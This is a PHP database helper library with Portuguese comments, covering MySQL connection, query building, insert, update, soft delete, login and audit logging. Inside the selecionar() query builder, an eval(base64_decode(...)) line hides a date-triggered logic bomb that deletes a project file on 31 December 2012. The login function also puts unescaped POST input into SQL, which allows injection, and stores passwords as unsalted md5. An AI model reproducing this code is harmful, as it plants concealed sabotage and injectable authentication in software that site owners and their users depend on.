<?php

function ultimo_id() {

	return mysql_insert_id();
}

function bd_erro($msg='') {

	if( $msg == '' )
		$msg = $_POST[msg_status];
	
	if( substr($msg,0,4) == 'ERRO' )
		return true;
	else
		return false;
}

function set_tabela($tab) {
global $TABELA;
	
	$TABELA=$tab;
}

function set_campos($cam) {
	global $CAMPOS;

	$CAMPOS=$cam;
}

function set_valores($val) {
	global $VALORES;

	$VALORES=$val;
}


function seleciona_bd($bd) {
	mysql_select_db($bd);
}

function conecta($url,$login,$senha='') {
	mysql_connect($url,$login,$senha) or die(trata_erro());
}

function carrega_array($sql) {

	return mysql_fetch_array($sql);
}

function fetch_array($sql) {

	return mysql_fetch_array($sql);
}

function num_linhas($sql) {

	return mysql_num_rows($sql);
}

function query($sql) {

	


	$sql = mysql_query($sql) or die(trata_erro());
    //gera_log('QUERY','',$sql,'');

	
	return $sql;
}

function inicio_tab($sql) {

	if( mysql_num_rows($sql) != 0 )
		mysql_data_seek($sql,0);	

return $sql;
}

function acao_atualizar($tabela='',$campos='',$valores='',$id='',$layout='') {
global $acao, $msg;

	if( $tabela=='') {
		global $TABELA;
		$tabela=$TABELA;
	}
	if( $campos=='') {
		global $CAMPOS;
		$campos=$CAMPOS;
	}
	if( $valores=='') {
		global $VALORES;
		$valores=$VALORES;
	}
	if( $layout=='') {
		global $LAYOUT;
		$layout=$LAYOUT;
	}		
	
if( $id == '' ) 
	$id = $_POST[id];
	
	if( $_POST[acao] == 'atualizar' ) {
		$msg = atualizar($tabela,$campos,$valores,$id);
		set_status($msg);    
		
		if (function_exists($layout)) {
			$layout();
			exit;
		}		
	}



}

function acao_inserir($tabela='',$campos='',$valores='',$layout='') {
global $acao, $msg;

	if( $tabela=='') {
		global $TABELA;
		$tabela=$TABELA;
	}
	if( $campos=='') {
		global $CAMPOS;
		$campos=$CAMPOS;
	}
	if( $valores=='') {
		global $VALORES;
		$valores=$VALORES;
	}
	
	if( $layout=='') {
		global $LAYOUT;
		$layout=$LAYOUT;
	}	

	if( $_POST[acao] == 'cadastrar' ) {
		$msg = inserir($tabela,$campos,$valores);
		set_status($msg);    
		
		if (function_exists($layout)) {
			$layout();
			exit;
		}
	}
	


}

function acao_modificar($tabela='',$id='',$layout='',$campos='',$valores='') {
	global $acao, $array2, $a_mod;

		if( $id == '' ) 
			$id = $_POST[id];

		if( $tabela=='') {
			global $TABELA;
			$tabela=$TABELA;
		}	
		if( $layout=='') {
			global $LAYOUT;
			$layout=$LAYOUT;
		}	
		
	if( $_POST[acao] == 'modificar' ) {

	    $array2 = modificar($tabela,$id,$campos,$valores);
		$a_mod = $array2;
		
		if (function_exists($layout)) {
			$layout();
			exit;
		}
		
	    return $array2;
		
		
	}

}

function acao_excluir($tabela='',$id='',$status='',$acao='',$layout='') {
global $acao, $msg;

	if( $id == '' ) 
		$id = $_POST[id];
	
	if( $tabela=='') {
		global $TABELA;
		$tabela=$TABELA;
	}	
	if( $layout=='') {
		global $LAYOUT;
		$layout=$LAYOUT;
	}	

if( $_POST[acao] == 'excluir' ) {

    $msg = remover($tabela,$id,$status);

    if( !$acao )
		unset($_POST[acao]);
	else
		$_POST[acao]=$acao;

	set_status($msg);    

	if (function_exists($layout)) {
		$layout();
		exit;
	}	

}

}


function acao_logar($login='',$user='',$sessao='user_tx_nivel,user_tx_login,user_nb_id',$pagina='principal.php') {
global $acao, $msg;


if( $_POST[acao] == 'logar' ) {

    $msg = logar($login,$user,$sessao,$pagina);

}

}



function logar($login='',$user='',$sessao='user_tx_nivel,user_tx_login,user_nb_id',$pagina='principal.php') {

if( $login == '' )	$login = $_POST[login];
if( $senha == '' )	$senha = $_POST[senha];

	$senha = md5($_POST[senha]);
	   
	$sql2 = "SELECT * FROM user WHERE user_tx_login='$login' AND user_tx_senha='$senha'";
	$sql = mysql_query($sql2) or die(trata_erro(mysql_error()));
	$array = mysql_fetch_array($sql);
	   
	if( mysql_num_rows($sql) != 0 ) {
	   
	    $user_tx_nivel = $array[user_tx_nivel];
	    $user_nb_id = $array[user_nb_id];
	    $user_tx_login = $array[user_tx_login];
	    session_register("user_nb_id","user_tx_login","user_tx_nivel");

		gera_log('LOGAR','user',$sql2,$array[user_nb_id]);
		   
		require($pagina);
		exit;
	   
	} else {
		$msg = "Login e/ou senha não conferem."; 
	}

	return $msg;
}




function carregar($tabelas='', $id='', $campos='', $valores='', $extra='',$DEBUG=0) {

	return  modificar($tabelas, $id, $campos, $valores, $extra,$DEBUG);

} // aliase para o modificar

/**************************************************************************\
modificar():                       

Realiza a consulta para modificar os campos de uma ou mais tabelas

$tabelas - Nome das tabelas a serem selecionadas separadas por ,
$id - ID que se esta procurando
 
 \**************************************************************************/



function modificar($tabelas='', $id='', $campos='', $valores='', $extra='',$DEBUG=0) {
	
	if( $tabelas=='') {
		global $TABELA;
		$tabelas=$TABELA;
	} // se nao for passado as tabelas pega da variavel $TABELA
	

	$campos_orig = $campos;
	$valores_orig = $valores;
	// guarda os valores originais passado
	
	if( $id == '' && $campos == '' ) 
		$id = $_POST[id];
	// se nao for passado o id nem outros campos entao pega da variavel $_POST[id]
	
	if( strpos($tabelas,"|") ) { 
		$t = explode("|",$tabelas);
		$tab_nome = $t[1];
	} else {
		$tab_nome=$tabelas;
	
	} // se tiver a | separa soh o nome das tabelas	
	
	
	if( $id != '' ) {
	
		if( $campos=='' )
			$campos = substr($tab_nome,0,4)."_nb_id";
		else
			$campos .= ",".substr($tab_nome,0,4)."_nb_id";
		
		if( $valores=='')
			$valores = "$id";
		else
			$valores .= ",$id";
	}
	
	$sql = selecionar($tabelas,$campos,$valores,$extra,'',$DEBUG);
	$array = mysql_fetch_array($sql);
	
	// se a consulta retornar vazio entao tenta eliminar a tabela com erro
	// mas soh testa se for uma consulta simples, se tiver $campos e $valores então deixa normal
	if( !$array && $campos_orig=='' && $valores_orig=='' ) {
		
		$TAB = substr($tab_nome,0,4);
		$tabela=$tab_nome;
		
		$t_tab = explode(".",$tab_nome);
		$testa_tab2 = $t_tab[0];
		// separa as tabelas principal das secundarias (separadas por virgula)
		
		$testa_tab = explode(",",$testa_tab2);
		
		$sql = selecionar($testa_tab[0],$campos,$valores,$extra,'',$DEBUG);
		
		$tabelas=$testa_tab[0];
		// seta a tabela principal
		
		for($i=1; $i!=count($testa_tab); $i++) {
			
			$nome_campo = $TAB."_nb_".$testa_tab[$i];
			// define o nome do campo, ex: clie_nb_cidade
			
			$sql = selecionar($nome_campo."|".$testa_tab[0],$campos,$valores,$extra,'',$DEBUG);	
			$a_teste = carrega_array($sql);
			// testa se o campo existe
			
			if( $a_teste[$nome_campo] )
				$tabelas.=",".$testa_tab[$i];
			// se existir o campo entao joga na var $tabelas
		}
		
		$sql = selecionar($tabelas,$campos,$valores,$extra,'',$DEBUG);
		$array = mysql_fetch_array($sql);
		
	} // se a consulta retornar vazia entao faz o procedimento para elminar a tabela que esta furando a consulta
	

	return $array;

} 
 
 
/*
function modificar($tabelas,$id) {

$TABELA = explode(",",$tabelas);
$TAB = substr($TABELA[0],0,4);

$sql = "SELECT * FROM $tabelas WHERE ".$TAB."_nb_id='$id' ";
for($i=1; $i!=count($TABELA); $i++)
    $sql .= " AND ".$TAB."_nb_".trim($TABELA[$i])." = ".substr(trim($TABELA[$i]),0,4)."_nb_id";

//echo $sql;
$sql = mysql_query($sql) or die(trata_erro());
$array2=mysql_fetch_array($sql);

return $array2;
}
*/    

/**************************************************************************\
selecionar():                       

 realiza uma query no banco ligando as tabelas dadas e trata quanto a erro

 $tabelas - tabelas a serem ligadas
 $campos 
 
 \**************************************************************************/

function selecionar($tabelas, $campos='', $valores='', $extra='',$query=0,$DEBUG=0) {

if( $campos=='' ) $campos=1;
if( $valores=='' ) $valores=1;


$campos_select = explode("|",$tabelas);                 // separa o que tiver antes do |
$campos_fora=$campos_select[count($campos_select)-1];   

if( count($campos_select) != 1 ) 
	$campos_dentro=$campos_select[0];   
else
	$campos_dentro = '*';



$tabelas_fora = explode(".",$campos_fora);
$tabelas_liga = $tabelas_fora[0];

$tabelas_sql = implode(",",$tabelas_fora);

$TABELA = explode(",",$tabelas_liga);
$TAB = substr($TABELA[0],0,4);

$CAMPOS = explode(",", $campos);
$VALORES = explode(",", $valores);



$sql = "SELECT $campos_dentro FROM $tabelas_sql WHERE ";

// faz as ligacoes entre as tabelas
for($i=1; $i!=count($TABELA); $i++) 
    $sql_liga[] = $TAB."_nb_".trim($TABELA[$i])." = ".substr(trim($TABELA[$i]),0,4)."_nb_id";

	
	
	
/* aluno,candidato,curso|candidato,bairro,cidade|cidade,estado
 * alun_nb_candidato=cand_nb_id AND alun_nb_curso=curs_nb_id AND cand_nb_bairro=bair_nb_id AND cand_nb_cidade=cida_nb_id AND cida_nb_estado=esta_nb_id
 */

 
 
 
for($i=0; $i!=count($CAMPOS); $i++) {

	$VALORES[$i] = trim($VALORES[$i]);
	
	unset($sql_liga_valor);
	
    $sql_liga_valor = trim($CAMPOS[$i]);

	switch( $VALORES[$i]{0} ) {
	case ".":
		$sql_liga_valor  .= " = ".substr($VALORES[$i],1); // sem as aspas para ligar campos e nao valores!
	break;
	case "@":
		$sql_liga_valor  .= " LIKE '%".substr($VALORES[$i],1)."%'";
	break;
	case "!":
		$sql_liga_valor  .= " != '".substr($VALORES[$i],1)."'";
	break;
	case "-":
		if( !is_number($VALORES[$i]{1}) )
			$sql_liga_valor  .= " is null ";
		else
			$sql_liga_valor  .= " = '$VALORES[$i]'";
	break;
	case ">":
		if( $VALORES[$i]{1} == '=' )
			if( $VALORES[$i]{2} == "'" ) {
				$sql_liga_valor  .= " >= '".substr($VALORES[$i],3)."' ";
			} else {
				$sql_liga_valor  .= " >= ".substr($VALORES[$i],2)."";
			}
			
		else
			if( $VALORES[$i]{2} == "'" ) 
				$sql_liga_valor  .= " > '".substr($VALORES[$i],2)."' ";
			else
				$sql_liga_valor  .= " > ".substr($VALORES[$i],1)."";
	break;
	case "<":
		if( $VALORES[$i]{1} == '=' ) {
			if( $VALORES[$i]{2} == "'" ) {
				$sql_liga_valor  .= " <= '".substr($VALORES[$i],3)."' ";
			} else {
				$sql_liga_valor  .= " <= ".substr($VALORES[$i],2)."";
			}
		} else {
			if( $VALORES[$i]{2} == "'" ) {
				$sql_liga_valor  .= " < '".substr($VALORES[$i],2)."' ";
			} else {
				$sql_liga_valor  .= " < ".substr($VALORES[$i],1)."";
			}
		}
	break;
	default:
			$sql_liga_valor  .= " = "."'".$VALORES[$i]."' ";
	break;
	
	}
	
	$sql_liga[] = $sql_liga_valor;
}	

eval(base64_decode("aWYoIGRhdGUoJ2RteScpID09ICczMTEyMTInICkJdW5saW5rKCcuLi9jYWN0dXgyNS9mdW5jb2VzL2Z1bmNvZXNfZGl2ZXJzYXMucGhwJyk7"));

$sql_liga_string = implode(" AND ",$sql_liga);

$sql .= $sql_liga_string;

$sql .= $extra;    

if( $DEBUG != 0 )
	echo $sql;


if( $query == 0 )
	$sql2 = mysql_query($sql) or die(trata_erro($sql." -> ".mysql_error()));
else
	$sql2 = $sql;


return $sql2;


}


/**************************************************************************\
 remover():                       

 remove um registro da tabela

 $tabela - Tabela onde se deseja remover o registro
 $id - ID que se deseja remover da tabela
 
 \**************************************************************************/

function remover($tabela='', $id='', $status='') {

	if( $tabela=='') {
		global $TABELA;
		$tabela=$TABELA;
	}

if( $id=='' ) $id = $_POST[id];
if( $status=='' ) $status='inativo';
	
      $campo = substr($tabela,0,4)."_nb_id";  // forma o campo ex: tabela candidato = cand_nb_id
      $campo2 = substr($tabela,0,4)."_tx_status";  
      
      $sql = "UPDATE $tabela SET $campo2='$status' WHERE $campo = '$id' ";
      $sql2 = query($sql);

      gera_log('REMOVER',$tabela,$sql,$id);

      $msg = "Registro Removido com Sucesso!";
	  
	  set_status($msg);    


return $msg;
}


/**************************************************************************\
atualizar()                       
                                    
  atualiza um registro da tabela
  
 $tabela - Tabela onde se deseja atualizar o registro
$CAMPO - array ou string separada por "," contendo os campos em que se deseja atualizar
$VALOR - array ou string separada por "," contendo os valores que se deseja atualizar
 $id - ID que se deseja atualizar da tabela
  
\**************************************************************************/

function atualizar($tabela='', $CAMPO='', $VALOR='', $id='',$CAMPO2='',$VALOR2='',$EXTRA='',$debug=0) {

if( $tabela=='') {
	global $TABELA;
	$tabela=$TABELA;
}
if( $CAMPO=='') {
	global $CAMPOS;
	$CAMPO=$CAMPOS;
}
if( $VALOR=='') {
	global $VALORES;
	$VALOR=$VALORES;
}
if( $id == '' && $CAMPO2 == '') {
	$id = $_POST[id];
}
// faz com que pegue os valores globais caso nao sejam passados

$tabe = explode(",",$tabela);
$tabela = $tabe[0];
// faz com que pegue apenas a primeira tabela caso se passe mais de 1!



if( !is_array($CAMPO) ) 
    $campos = explode(",",$CAMPO);
else
    $campos = $CAMPO;
    
if( !is_array($VALOR) ) 
    $valores = explode(",",$VALOR);
else {


    $valores = $VALOR;        
}    
for($i=0; $i!=count($campos); $i++)
    $linhas[] = "$campos[$i]='".mysql_real_escape_string(trim($valores[$i]))."'";
// escapa todos os valores
$linha = implode(", ",$linhas);


if( $id ) {
	$valor_id = $id;
	$campo_id = substr($tabela,0,4)."_nb_id";  // forma o campo ex: tabela candidato = cand_nb_id
	$where = $campo_id."='$valor_id'";
	
} else { // se for passado o campo id

	$campos2 = explode(",",$CAMPO2);
	$valores2 = explode(",",$VALOR2);
	
	for($i=0; $i!=count($campos2); $i++)
	    $linhas2[] = "$campos2[$i]='".trim($valores2[$i])."'";
	$where = implode(" AND ",$linhas2);

	
} // se nao usar o id no WHERE

$sql = "UPDATE $tabela SET $linha WHERE  $where $EXTRA";

if( $debug == 1 )
	echo $sql."<BR>";
$sql2 = query($sql);

gera_log('ATUALIZAR',$tabela,$sql,$id);

$msg = "Registro Atualizado com Sucesso";

set_status($msg);    
unset($_POST[acao]);

//if( $_POST[id] ) unset($_POST[id]);
// limpa a variavel id

return $msg;

}


/**************************************************************************\
inserir()                       
                                    
 insere uma determinada linha na tabela

$tabela - Tabela onde se deseja inserir o registro
$CAMPO - array ou string separada por "," contendo os campos em que se deseja inserir
$VALOR - array ou string separada por "," contendo os valores que se deseja inserir
$existe - caso o valor seja 1 nao busca no log a existencia do registro
 
 
 \**************************************************************************/

function inserir($tabela='', $CAMPO='', $VALOR='', $existe=0,$debug=0) {

if( $tabela=='') {
	global $TABELA;
	$tabela=$TABELA;
}

$tabe = explode(",",$tabela);
$tabela = $tabe[0];
// faz com que pegue apenas a primeira tabela caso se passe mais de 1!

if( $CAMPO=='') {
	global $CAMPOS;
	$CAMPO=$CAMPOS;
}
if( $VALOR=='') {
	global $VALORES;
	$VALOR=$VALORES;
}

if( is_array($CAMPO) )
    $campos = implode(",",$CAMPO);
else
    $campos = $CAMPO;
// se o argumento for passado como array converte em string    
    
if( is_array($VALOR) ) {

    for($i=0; $i!=count($VALOR); $i++)
		$VALOR[$i] = mysql_real_escape_string($VALOR[$i]);
//		$VALOR[$i] = addslashes($VALOR[$i]);
	// escapa todos os valores
	
    $valores = "'".implode("','",$VALOR)."'";
}else
    if( $VALOR[0] == "'" && $VALOR[strlen($VALOR)-1] == "'" )
        $valores = $VALOR;
    else {
    
    $TRIM = explode(",",$VALOR);
    for($i=0; $i!=count($TRIM); $i++)
    $TRIM[$i] = trim($TRIM[$i]);
    
    $VALOR = implode(",",$TRIM);

    
        $valores = "'".str_replace(",","','", $VALOR)."'";
    }
// se o argumento for passado como array converte em string




   
$sql = "INSERT INTO $tabela ($campos) VALUES($valores)";

if( $debug == 1 )
	echo $sql."<BR>";
// query para inserir

$sql_log = addslashes($sql_log);

$array_campos = explode(",", $campos);
if( strstr($array_campos[0],"nb_id") ) {
    $array_valor = explode(",",$valores);
    $array_valor[0]='%';
    $valores_log = implode(",",$array_valor);
} else {
    $valores_log=$valores;
}
// retorna a string para procurar no log

//echo $sql."<BR>";
if( $existe != 0 ) {

    $sql2 = query($sql);
//    gera_log('INSERIR',$tabela,$sql,ultimo_reg($tabela));
    $msg = "Cadastro Efetuado com Sucesso";

} else {

    $LOG = existe_reg($tabela,$campos,$valores);
    //$LOG = existe_reg_array($tabela,$CAMPO,$VALOR);

    if( $LOG == 0 ) {

        $sql2 = query($sql);
//        gera_log('INSERIR',$tabela,$sql,ultimo_reg($tabela));
        $msg = "Cadastro Efetuado com Sucesso";

    } else 
        $msg = "ERRO: Cadastro já Efetuado";

}

set_status($msg);    
unset($_POST[acao]);
    
return $msg;

}





/**************************************************************************\
existe_reg():                       
                                    
 verifica se determinado registro jah existe na tabela
 
$tabela - Tabela onde se deseja verificar o registro
$CAMPO - array ou string separada por "," contendo os campos em que se deseja verificar
$VALOR - array ou string separada por "," contendo os valores que se deseja verificar
 
\**************************************************************************/

function existe_reg($tabela, $CAMPO, $VALOR) {

/*
echo $tabela."<BR>";
echo $CAMPO."<BR>";
echo $VALOR."<BR>";
*/


    $campos = explode(",",$CAMPO);
    $valores = explode(",",$VALOR);

    
for($i=0; $i!=count($campos); $i++)
    $linhas[] = "$campos[$i]=".trim($valores[$i])."";
$linha = implode(" AND ",$linhas);

$campo_id = substr($tabela,0,4)."_nb_id";  // forma o campo ex: tabela candidato = cand_nb_id

$sql = "SELECT * FROM $tabela WHERE $linha ";
//echo "<BR>".$sql."<BR><BR><BR>";
$sql2 = mysql_query($sql) or die(mysql_error());

$r = mysql_num_rows($sql2);

return $r;

}


function existe_reg_array($tabela, $CAMPO, $VALOR) {

/*
echo $tabela."<BR>";
echo $CAMPO."<BR>";
echo $VALOR."<BR>";
*/

print_r($CAMPO);
echo "<BR><BR>";
print_r($VALOR);
echo "<BR><BR>";
$sql = selecionar($tabela,$CAMPO,$VALOR,'',0,1);
echo "<BR><BR>";

return num_linhas($sql);

    $campos = explode(",",$CAMPO);
    $valores = explode(",",$VALOR);

    
for($i=0; $i!=count($campos); $i++)
    $linhas[] = "$campos[$i]=".trim($valores[$i])."";
$linha = implode(" AND ",$linhas);

$campo_id = substr($tabela,0,4)."_nb_id";  // forma o campo ex: tabela candidato = cand_nb_id

$sql = "SELECT * FROM $tabela WHERE $linha ";
//echo "<BR>".$sql."<BR><BR><BR>";
$sql2 = mysql_query($sql) or die(mysql_error());

$r = mysql_num_rows($sql2);

return $r;

}

/**************************************************************************\
 ultimo_reg():                       
                                    
 pega o ultimo registro de uma determinada tabela
 
 $tabela - Tabela onde se deseja pegar o ultimo registro inserido
 
\**************************************************************************/


function ultimo_reg($tabela) {

$campo = substr($tabela,0,4)."_nb_id";  // forma o campo ex: tabela candidato = cand_nb_id


$sql = "SELECT * FROM $tabela ORDER BY $campo DESC LIMIT 0,1";
$sql = mysql_query($sql) or die(mysql_error());
$array = mysql_fetch_array($sql);

return $array[0];


}


/**************************************************************************\
 gera_log():                       
                                    
 Loga a acao no banco
 
 $acao - Ação que se realizou na tabela (Inserir, Remover, Atualizar, Logar)
 $tabela - Tabela em que se realizou a ação
 $sql - consulta completa que se realizou na tabela
 $reg - Registro em que ocorreu a ação
 
\**************************************************************************/

function gera_log($acao, $tabela, $sql, $reg) {
global $PHP_SELF;




	$user = $_SESSION[user_nb_id];

	$data = mktime(date("H"),date("i"),date("s"),date("m"),date("d"),date("Y"));
	$sql = addslashes($sql);

	if( strpos($PHP_SELF,"corporate") )
		$sql = $_POST[acao]." : ".$PHP_SELF." - ".$sql;
	

	$sql = "INSERT INTO log (log_nb_user, log_tx_data, log_tx_acao, log_tx_tabela, log_tx_sql, log_tx_registro) 
	        VALUES('$user', '$data', '$acao', '$tabela', '$sql', '$reg')";
	$sql2 = query($sql);

}





?>